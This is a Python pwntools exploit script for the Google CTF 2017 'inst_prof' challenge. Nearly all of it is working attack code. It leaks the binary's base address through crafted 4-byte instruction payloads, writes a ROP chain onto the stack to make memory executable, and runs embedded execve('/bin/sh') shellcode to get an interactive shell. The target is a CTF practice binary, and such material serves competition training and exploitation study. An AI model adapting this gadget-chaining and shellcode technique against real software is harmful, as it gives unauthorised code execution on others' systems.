#
# Google CTF 2017 pwn inst_prof
#
# Based on
# * https://develbranch.com

from pwn import *
import sys

b = ELF('./inst_prof')

context.arch = b.arch
context.log_level = 'info'

r = process('./inst_prof')

def assemble(code):
    encoding = asm(code)
    if len(encoding) > 4:
        raise Exception("TOO LONG! code=%s, len=%d" % (code, len(encoding)))
    while len(encoding) < 4:
        encoding += '\xc3'
    return encoding

def movb_r15(n):
    if n <= 0x7f:
        return assemble('push %d; pop r15' % n)
    else:
        return assemble('xor r15, r15') + assemble('inc r15') * n

#
# stack based programming
#
def store_r15(stack_off):
    return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov [r14], r15')

def load_to_r15(stack_off):
    return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov r15, [r14]')

def mov_r15_retaddr():
    return assemble('mov r15,[rsp]')

def write_string(stack_off, s):
    encoding = ''
    for c in s:
        encoding += movb_r15(ord(c))
        encoding += store_r15(stack_off)
        stack_off += 1
    return encoding

def s(asm):
    r.send(assemble(asm))

# add rsp,0x1000 -> push rsp into 'rw-' region
adjust_stack = "\x48\x81\xC4\x00\x10\x00\x00" 

# Execute /bin/sh - 27 bytes : http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 

def recv_all():
    b = ""
    last_recv = True
    while last_recv:
        try:
            last_recv = r.recv(1024)
        except socket.timeout:
            last_recv = None
        if last_recv:
            b += last_recv
    return b

if __name__ == "__main__":

    r.recvuntil('ready')

    r.settimeout(0.5)

    s('mov r14,[rsp]')
    r.recvn(8)
    r.send( assemble('dec r14; ret') * (0xb18 - 0x8a2) )
    recv_all()

    s('push rsp; pop rsi; push r14')

    d = recv_all()
    l = d[len(d)-6:len(d)] + '\x00\x00'
    l = u64(l)

    B = l - 0x8a2
    log.info("code base: 0x%x" % B)

    pop_rdi = 0xbc3 # pop rdi; ret
    pop_rsi = 0xbc1 # pop rsi; pop r15; ret
    pop_r13 = 0xbbe # pop r13; pop r14; pop r15; ret
    mov_rdx_r13 = 0xba0 # mov rdx,r13; mov rsi,r14; mov edi,r15d; call qword [r12+rbx*8]
    pop_rbx = 0xaab # pop rbx; pop r12; pop rbp; ret

    # mov edx,7
    # mov esi,0x1000
    # mov rdi,addr
    # call mprotect

    offset = 56
    op = ''

    op += write_string(offset, p64(B + pop_rdi))

    op += movb_r15(0)
    op += store_r15(offset + 0x8)

    op += write_string(offset + 0x10, p64(B + b.plt['alarm']))

    op += write_string(offset + 0x18, p64(B + pop_rdi))

    op += assemble('mov r14,rcx')
    op += assemble('push rsp; pop r15')
    op += assemble('dec r14')
    op += assemble('not r14')
    op += assemble('and r15,r14')
    op += store_r15(offset + 0x20)

    op += mov_r15_retaddr()
    op += assemble('dec r15') * (0xb18 - 0xa20)
    op += store_r15(offset + 0x28)

    op += assemble('push rsp; pop r15')
    op += assemble('inc r15') * (offset + 0x70)
    op += store_r15(offset + 0x30)

    op += write_string(offset + 0x70, adjust_stack + shellcode)

    op += movb_r15(offset)
    op += assemble('add rsp,r15; ret')

    r.send(op)
    r.interactive()
